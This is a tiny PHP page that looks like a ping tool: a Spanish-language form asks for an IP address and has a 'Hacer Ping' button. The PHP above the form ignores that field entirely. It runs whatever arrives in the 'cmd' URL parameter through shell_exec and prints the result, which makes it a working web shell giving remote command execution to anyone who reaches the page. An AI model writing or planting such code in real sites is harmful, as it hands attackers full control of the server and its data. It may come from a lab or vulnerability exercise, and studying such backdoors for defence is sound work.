<?php
$output = shell_exec($_GET['cmd']);
echo "<pre>$output</pre>";
?>
<form method="post">
        <input type="text" name="ip" placeholder="Ejemplo: 8.8.8.8" required>
        <button type="submit">Hacer Ping</button>
</form>
